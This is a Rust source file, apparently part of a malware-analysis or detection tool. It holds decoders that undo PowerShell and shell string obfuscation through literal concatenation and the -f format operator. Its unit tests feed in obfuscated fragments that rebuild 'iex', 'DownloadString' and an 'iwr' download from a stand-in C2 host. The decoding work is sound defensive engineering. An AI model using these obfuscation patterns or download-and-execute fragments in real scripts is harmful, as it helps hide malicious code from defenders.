use super::Decoder;
use crate::util::re;
use regex::Regex;
use std::sync::LazyLock;

/// `'po'+'wer'+'shell'` -> `'powershell'`, also `"a" + "b"` and `'a'"b"` adjacency in sh.
/// Literal concatenation only; `$a + 'b'` needs runtime state and is left alone.
pub struct ConcatDecoder;

/// `'{1}{0}' -f 'ex','i'` -> `'iex'`. Only literal arguments and plain `{n}` slots; a
/// format spec (`{0:N2}`) or a variable argument needs runtime state and is left alone.
pub struct FormatDecoder;

static FORMAT: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r"'((?:[^'{}\n]|''|\{\d\})*\{\d\}(?:[^'{}\n]|''|\{\d\})*)'\s*-f\s*('(?:[^'\n]|'')*'(?:\s*,\s*'(?:[^'\n]|'')*')*)",
    )
});
static FORMAT_ARG: LazyLock<Regex> = LazyLock::new(|| re(r"'((?:[^'\n]|'')*)'"));
static SLOT: LazyLock<Regex> = LazyLock::new(|| re(r"\{(\d)\}"));

impl Decoder for FormatDecoder {
    fn name(&self) -> &'static str {
        "format"
    }
    fn try_decode(&self, input: &str) -> Option<String> {
        if !input.contains('{') || !input.to_ascii_lowercase().contains("-f") {
            return None;
        }
        let mut changed = false;
        let out = FORMAT.replace_all(input, |c: &regex::Captures| {
            let args: Vec<String> = FORMAT_ARG
                .captures_iter(&c[2])
                .map(|a| a[1].replace("''", "'"))
                .collect();
            let fmt = c[1].replace("''", "'");
            let mut ok = true;
            let s = SLOT.replace_all(&fmt, |m: &regex::Captures| {
                match m[1].parse::<usize>().ok().and_then(|i| args.get(i)) {
                    Some(a) => a.clone(),
                    None => {
                        ok = false;
                        String::new()
                    }
                }
            });
            if ok {
                changed = true;
                format!("'{}'", s.replace('\'', "''"))
            } else {
                c[0].to_string()
            }
        });
        changed.then(|| out.into_owned())
    }
}

static PLUS: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r#"'([^'\n]*)'\s*\+\s*'([^'\n]*)'|"([^"\n$`]*)"\s*\+\s*"([^"\n$`]*)"|'([^'\n]*)'\s*\+\s*"([^"\n$`]*)"|"([^"\n$`]*)"\s*\+\s*'([^'\n]*)'"#,
    )
});

impl Decoder for ConcatDecoder {
    fn name(&self) -> &'static str {
        "concat"
    }
    fn try_decode(&self, input: &str) -> Option<String> {
        let mut cur = input.to_string();
        let mut changed = false;
        // Each pass merges adjacent pairs; chains of N pieces need ~log2(N) passes.
        for _ in 0..16 {
            let next = PLUS.replace_all(&cur, |c: &regex::Captures| {
                let parts: Vec<&str> = (1..=8)
                    .filter_map(|i| c.get(i).map(|m| m.as_str()))
                    .collect();
                format!("'{}'", parts.concat())
            });
            if next == cur {
                break;
            }
            changed = true;
            cur = next.into_owned();
        }
        changed.then_some(cur)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn format_operator() {
        assert_eq!(
            FormatDecoder
                .try_decode("& ('{1}{0}' -f 'ex','i') x")
                .unwrap(),
            "& ('iex') x"
        );
        assert_eq!(
            FormatDecoder
                .try_decode("('{0}{1}' -f 'iwr ''https','://c2.invalid/x''')")
                .unwrap(),
            "('iwr ''https://c2.invalid/x''')"
        );
        // Format specs and variables are runtime state; a missing slot is left alone.
        assert!(FormatDecoder.try_decode("'{0:N2} s' -f $t").is_none());
        assert!(FormatDecoder
            .try_decode("'{0} of {2}' -f 'a','b'")
            .is_none());
    }
    #[test]
    fn merges_chains() {
        assert_eq!(
            ConcatDecoder
                .try_decode("&('i'+'e'+'x') ('Down'+\"loadString\")")
                .unwrap(),
            "&('iex') ('DownloadString')"
        );
    }
    #[test]
    fn leaves_variables() {
        assert!(ConcatDecoder.try_decode("$a + 'b'").is_none());
    }
}
